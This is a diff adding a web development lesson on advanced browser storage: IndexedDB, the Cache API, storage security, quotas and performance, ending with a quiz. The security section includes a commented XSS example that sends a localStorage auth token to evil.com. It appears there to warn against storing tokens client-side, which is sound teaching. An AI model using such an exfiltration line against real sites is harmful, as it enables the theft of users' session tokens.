@@ -1,0 +1,566 @@
+# Web Storage
+
+Welcome to the advanced level! Here we'll explore IndexedDB for complex data storage, the Cache API for offline capabilities, and critical security considerations for client-side storage.
+
+<InfoBox type="tip" title="What You'll Master">
+IndexedDB for structured data, Cache API for offline-first apps, storage security best practices, and performance optimization techniques.
+</InfoBox>
+
+<ProgressCheckpoint section="introduction" xpReward={15} />
+
+## IndexedDB: A Real Database in the Browser
+
+IndexedDB is a full-featured, transactional database built into every modern browser. Unlike localStorage, it can store any JavaScript value and supports indexes for fast queries.
+
+### Opening a Database
+
+```javascript
+// Open (or create) a database
+const request = indexedDB.open('MyAppDB', 1);
+
+request.onerror = (event) => {
+  console.error('Database error:', event.target.error);
+};
+
+request.onsuccess = (event) => {
+  const db = event.target.result;
+  console.log('Database opened successfully');
+};
+
+// Called when database is created or version changes
+request.onupgradeneeded = (event) => {
+  const db = event.target.result;
+  
+  // Create an object store (like a table)
+  if (!db.objectStoreNames.contains('users')) {
+    const store = db.createObjectStore('users', { keyPath: 'id', autoIncrement: true });
+    
+    // Create indexes for faster queries
+    store.createIndex('email', 'email', { unique: true });
+    store.createIndex('name', 'name', { unique: false });
+  }
+};
+```
+
+<KeyConcept title="IndexedDB Concepts">
+- **Database** — Container for object stores
+- **Object Store** — Like a table, holds records
+- **Index** — Enables fast lookups on specific fields
+- **Transaction** — Groups operations, ensures data integrity
+- **Cursor** — Iterates over records
+</KeyConcept>
+
+### CRUD Operations
+
+```javascript
+class IndexedDBStore {
+  constructor(dbName, storeName, version = 1) {
+    this.dbName = dbName;
+    this.storeName = storeName;
+    this.version = version;
+    this.db = null;
+  }
+
+  async open() {
+    return new Promise((resolve, reject) => {
+      const request = indexedDB.open(this.dbName, this.version);
+      
+      request.onerror = () => reject(request.error);
+      request.onsuccess = () => {
+        this.db = request.result;
+        resolve(this.db);
+      };
+      
+      request.onupgradeneeded = (event) => {
+        const db = event.target.result;
+        if (!db.objectStoreNames.contains(this.storeName)) {
+          db.createObjectStore(this.storeName, { keyPath: 'id', autoIncrement: true });
+        }
+      };
+    });
+  }
+
+  async add(data) {
+    return this._transaction('readwrite', (store) => store.add(data));
+  }
+
+  async get(id) {
+    return this._transaction('readonly', (store) => store.get(id));
+  }
+
+  async getAll() {
+    return this._transaction('readonly', (store) => store.getAll());
+  }
+
+  async update(data) {
+    return this._transaction('readwrite', (store) => store.put(data));
+  }
+
+  async delete(id) {
+    return this._transaction('readwrite', (store) => store.delete(id));
+  }
+
+  async _transaction(mode, operation) {
+    return new Promise((resolve, reject) => {
+      const transaction = this.db.transaction(this.storeName, mode);
+      const store = transaction.objectStore(this.storeName);
+      const request = operation(store);
+      
+      request.onsuccess = () => resolve(request.result);
+      request.onerror = () => reject(request.error);
+    });
+  }
+}
+
+// Usage
+const userStore = new IndexedDBStore('MyApp', 'users');
+await userStore.open();
+
+await userStore.add({ name: 'Alex', email: 'alex@example.com' });
+const users = await userStore.getAll();
+console.log(users);
+```
+
+<ProgressCheckpoint section="local-storage" xpReward={15} />
+
+## Advanced IndexedDB: Indexes and Queries
+
+```javascript
+// Creating indexes during upgrade
+request.onupgradeneeded = (event) => {
+  const db = event.target.result;
+  const store = db.createObjectStore('products', { keyPath: 'id' });
+  
+  // Single-field indexes
+  store.createIndex('category', 'category');
+  store.createIndex('price', 'price');
+  
+  // Compound index for complex queries
+  store.createIndex('category_price', ['category', 'price']);
+};
+
+// Query by index
+async function getProductsByCategory(db, category) {
+  return new Promise((resolve, reject) => {
+    const transaction = db.transaction('products', 'readonly');
+    const store = transaction.objectStore('products');
+    const index = store.index('category');
+    const request = index.getAll(category);
+    
+    request.onsuccess = () => resolve(request.result);
+    request.onerror = () => reject(request.error);
+  });
+}
+
+// Range queries
+async function getProductsInPriceRange(db, min, max) {
+  return new Promise((resolve, reject) => {
+    const transaction = db.transaction('products', 'readonly');
+    const store = transaction.objectStore('products');
+    const index = store.index('price');
+    const range = IDBKeyRange.bound(min, max);
+    const request = index.getAll(range);
+    
+    request.onsuccess = () => resolve(request.result);
+    request.onerror = () => reject(request.error);
+  });
+}
+```
+
+<KeyConcept title="IDBKeyRange Methods">
+- `IDBKeyRange.only(value)` — Exact match
+- `IDBKeyRange.lowerBound(value)` — Greater than or equal
+- `IDBKeyRange.upperBound(value)` — Less than or equal
+- `IDBKeyRange.bound(lower, upper)` — Between two values
+</KeyConcept>
+
+<ProgressCheckpoint section="session-storage" xpReward={15} />
+
+## Cache API: Offline-First Applications
+
+The Cache API lets you store HTTP responses for offline access. It's the foundation of Progressive Web Apps (PWAs).
+
+```javascript
+// Open a cache
+const cache = await caches.open('my-app-v1');
+
+// Cache a response
+await cache.add('/api/data');
+
+// Cache multiple resources
+await cache.addAll([
+  '/',
+  '/styles.css',
+  '/app.js',
+  '/images/logo.png'
+]);
+
+// Manual caching with custom response
+const response = await fetch('/api/users');
+await cache.put('/api/users', response.clone());
+
+// Retrieve from cache
+const cachedResponse = await cache.match('/api/users');
+if (cachedResponse) {
+  const data = await cachedResponse.json();
+  console.log('From cache:', data);
+}
+```
+
+### Cache-First Strategy
+
+```javascript
+async function fetchWithCache(url, cacheName = 'app-cache') {
+  const cache = await caches.open(cacheName);
+  
+  // Try cache first
+  const cachedResponse = await cache.match(url);
+  if (cachedResponse) {
+    // Optionally update cache in background
+    fetch(url).then(response => {
+      cache.put(url, response.clone());
+    });
+    return cachedResponse;
+  }
+  
+  // Fall back to network
+  const networkResponse = await fetch(url);
+  cache.put(url, networkResponse.clone());
+  return networkResponse;
+}
+
+// Usage
+const response = await fetchWithCache('/api/products');
+const products = await response.json();
+```
+
+### Network-First Strategy
+
+```javascript
+async function fetchNetworkFirst(url, cacheName = 'app-cache') {
+  const cache = await caches.open(cacheName);
+  
+  try {
+    // Try network first
+    const networkResponse = await fetch(url);
+    cache.put(url, networkResponse.clone());
+    return networkResponse;
+  } catch (error) {
+    // Fall back to cache if offline
+    const cachedResponse = await cache.match(url);
+    if (cachedResponse) {
+      return cachedResponse;
+    }
+    throw error;
+  }
+}
+```
+
+<ProgressCheckpoint section="cookies" xpReward={15} />
+
+## Storage Security Considerations
+
+Client-side storage has significant security implications. Here's what you need to know:
+
+### XSS Vulnerabilities
+
+```javascript
+// DANGER: Never store sensitive data in localStorage
+// If an attacker injects JavaScript, they can read everything!
+
+// BAD - Don't do this!
+localStorage.setItem('authToken', 'secret-jwt-token');
+localStorage.setItem('creditCard', '4111-1111-1111-1111');
+
+// An XSS attack could steal this:
+// fetch('https://evil.com/steal?token=' + localStorage.getItem('authToken'));
+```
+
+<InfoBox type="warning" title="Security Rules">
+1. **Never store sensitive data** in localStorage/sessionStorage
+2. **Use HttpOnly cookies** for authentication tokens
+3. **Sanitize all user input** to prevent XSS
+4. **Implement Content Security Policy** headers
+5. **Encrypt sensitive data** if you must store it client-side
+</InfoBox>
+
+### Encryption for Sensitive Data
+
+```javascript
+// Simple encryption using Web Crypto API
+async function encryptData(data, password) {
+  const encoder = new TextEncoder();
+  const dataBuffer = encoder.encode(JSON.stringify(data));
+  
+  // Derive key from password
+  const keyMaterial = await crypto.subtle.importKey(
+    'raw',
+    encoder.encode(password),
+    'PBKDF2',
+    false,
+    ['deriveBits', 'deriveKey']
+  );
+  
+  const salt = crypto.getRandomValues(new Uint8Array(16));
+  const key = await crypto.subtle.deriveKey(
+    { name: 'PBKDF2', salt, iterations: 100000, hash: 'SHA-256' },
+    keyMaterial,
+    { name: 'AES-GCM', length: 256 },
+    false,
+    ['encrypt']
+  );
+  
+  const iv = crypto.getRandomValues(new Uint8Array(12));
+  const encrypted = await crypto.subtle.encrypt(
+    { name: 'AES-GCM', iv },
+    key,
+    dataBuffer
+  );
+  
+  // Return salt, iv, and encrypted data as base64
+  return {
+    salt: btoa(String.fromCharCode(...salt)),
+    iv: btoa(String.fromCharCode(...iv)),
+    data: btoa(String.fromCharCode(...new Uint8Array(encrypted)))
+  };
+}
+
+// Store encrypted
+const encrypted = await encryptData({ secret: 'data' }, 'user-password');
+localStorage.setItem('encrypted', JSON.stringify(encrypted));
+```
+
+<ProgressCheckpoint section="indexed-db" xpReward={15} />
+
+## Storage Quotas and Management
+
+```javascript
+// Check storage quota (modern browsers)
+async function checkStorageQuota() {
+  if ('storage' in navigator && 'estimate' in navigator.storage) {
+    const estimate = await navigator.storage.estimate();
+    return {
+      usage: estimate.usage,
+      quota: estimate.quota,
+      usageInMB: (estimate.usage / 1024 / 1024).toFixed(2),
+      quotaInMB: (estimate.quota / 1024 / 1024).toFixed(2),
+      percentUsed: ((estimate.usage / estimate.quota) * 100).toFixed(2)
+    };
+  }
+  return null;
+}
+
+// Request persistent storage (won't be cleared under storage pressure)
+async function requestPersistentStorage() {
+  if ('storage' in navigator && 'persist' in navigator.storage) {
+    const isPersisted = await navigator.storage.persist();
+    console.log(`Persistent storage ${isPersisted ? 'granted' : 'denied'}`);
+    return isPersisted;
+  }
+  return false;
+}
+
+// Clear old caches
+async function clearOldCaches(currentVersion) {
+  const cacheNames = await caches.keys();
+  await Promise.all(
+    cacheNames
+      .filter(name => name !== currentVersion)
+      .map(name => caches.delete(name))
+  );
+}
+```
+
+### LRU Cache Implementation
+
+```javascript
+class LRUStorage {
+  constructor(maxItems = 100, storageKey = 'lru-cache') {
+    this.maxItems = maxItems;
+    this.storageKey = storageKey;
+    this.cache = this._load();
+  }
+
+  _load() {
+    try {
+      const data = localStorage.getItem(this.storageKey);
+      return data ? JSON.parse(data) : { order: [], items: {} };
+    } catch {
+      return { order: [], items: {} };
+    }
+  }
+
+  _save() {
+    localStorage.setItem(this.storageKey, JSON.stringify(this.cache));
+  }
+
+  get(key) {
+    if (!(key in this.cache.items)) return null;
+    
+    // Move to end (most recently used)
+    this.cache.order = this.cache.order.filter(k => k !== key);
+    this.cache.order.push(key);
+    this._save();
+    
+    return this.cache.items[key];
+  }
+
+  set(key, value) {
+    // Remove if exists
+    if (key in this.cache.items) {
+      this.cache.order = this.cache.order.filter(k => k !== key);
+    }
+    
+    // Evict oldest if at capacity
+    while (this.cache.order.length >= this.maxItems) {
+      const oldest = this.cache.order.shift();
+      delete this.cache.items[oldest];
+    }
+    
+    // Add new item
+    this.cache.items[key] = value;
+    this.cache.order.push(key);
+    this._save();
+  }
+}
+
+const cache = new LRUStorage(50);
+cache.set('user:1', { name: 'Alex' });
+console.log(cache.get('user:1'));
+```
+
+<ProgressCheckpoint section="storage-comparison" xpReward={15} />
+
+## Performance Optimization
+
+### Batch Operations
+
+```javascript
+// Bad: Multiple synchronous writes
+for (const item of items) {
+  localStorage.setItem(`item:${item.id}`, JSON.stringify(item));
+}
+
+// Better: Batch into single write
+localStorage.setItem('items', JSON.stringify(items));
+
+// Best for IndexedDB: Use single transaction
+async function batchInsert(db, storeName, items) {
+  return new Promise((resolve, reject) => {
+    const transaction = db.transaction(storeName, 'readwrite');
+    const store = transaction.objectStore(storeName);
+    
+    items.forEach(item => store.add(item));
+    
+    transaction.oncomplete = () => resolve();
+    transaction.onerror = () => reject(transaction.error);
+  });
+}
+```
+
+### Debounced Persistence
+
+```javascript
+function createDebouncedStorage(key, delay = 1000) {
+  let timeout = null;
+  let pendingData = null;
+
+  return {
+    save(data) {
+      pendingData = data;
+      
+      if (timeout) clearTimeout(timeout);
+      
+      timeout = setTimeout(() => {
+        localStorage.setItem(key, JSON.stringify(pendingData));
+        timeout = null;
+      }, delay);
+    },
+    
+    load() {
+      const data = localStorage.getItem(key);
+      return data ? JSON.parse(data) : null;
+    },
+    
+    flush() {
+      if (timeout) {
+        clearTimeout(timeout);
+        localStorage.setItem(key, JSON.stringify(pendingData));
+        timeout = null;
+      }
+    }
+  };
+}
+
+// Usage - saves at most once per second
+const storage = createDebouncedStorage('app-state', 1000);
+storage.save({ count: 1 });
+storage.save({ count: 2 }); // Replaces previous
+storage.save({ count: 3 }); // Only this gets saved
+```
+
+<StorageComparison />
+
+<ProgressCheckpoint section="summary" xpReward={10} />
+
+## Quick Reference
+
+<KeyConcept title="IndexedDB Pattern">
+```javascript
+const request = indexedDB.open('DB', 1);
+request.onupgradeneeded = (e) => { /* create stores */ };
+request.onsuccess = (e) => { /* use db */ };
+```
+</KeyConcept>
+
+<KeyConcept title="Cache API Pattern">
+```javascript
+const cache = await caches.open('v1');
+await cache.add('/resource');
+const response = await cache.match('/resource');
+```
+</KeyConcept>
+
+<KeyConcept title="Security Checklist">
+- ❌ Never store auth tokens in localStorage
+- ✅ Use HttpOnly cookies for sensitive data
+- ✅ Encrypt if client-side storage is required
+- ✅ Implement CSP headers
+- ✅ Sanitize all user input
+</KeyConcept>
+
+## Quick Quiz
+
+<Quiz>
+  <Question text="What's the main advantage of IndexedDB over localStorage?">
+    <Answer>It's faster</Answer>
+    <Answer>It has a simpler API</Answer>
+    <Answer correct>It can store structured data and supports queries</Answer>
+    <Answer>It's more secure</Answer>
+  </Question>
+  
+  <Question text="Why shouldn't you store JWT tokens in localStorage?">
+    <Answer>localStorage is too slow</Answer>
+    <Answer correct>XSS attacks can steal them</Answer>
+    <Answer>They're too large</Answer>
+    <Answer>Browsers don't allow it</Answer>
+  </Question>
+  
+  <Question text="What does the Cache API primarily store?">
+    <Answer>JSON objects</Answer>
+    <Answer>User preferences</Answer>
+    <Answer correct>HTTP responses</Answer>
+    <Answer>Database records</Answer>
+  </Question>
+  
+  <Question text="What is an IDBKeyRange used for?">
+    <Answer>Encrypting data</Answer>
+    <Answer correct>Querying ranges of values in IndexedDB</Answer>
+    <Answer>Setting storage limits</Answer>
+    <Answer>Creating database connections</Answer>
+  </Question>
+</Quiz>
+
+---
+
+**Congratulations!** 🎉 You've mastered web storage from basics to advanced patterns. You now understand localStorage, sessionStorage, cookies, IndexedDB, the Cache API, and critical security considerations. Use this knowledge to build fast, offline-capable, and secure web applications!
